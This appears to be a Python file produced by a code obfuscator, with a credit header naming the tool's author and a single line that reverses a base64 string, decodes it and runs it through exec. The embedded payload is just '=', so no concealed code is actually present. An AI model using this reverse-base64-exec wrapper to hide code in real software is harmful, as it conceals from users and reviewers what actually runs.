# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Tue Jun 14 00:08:58 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))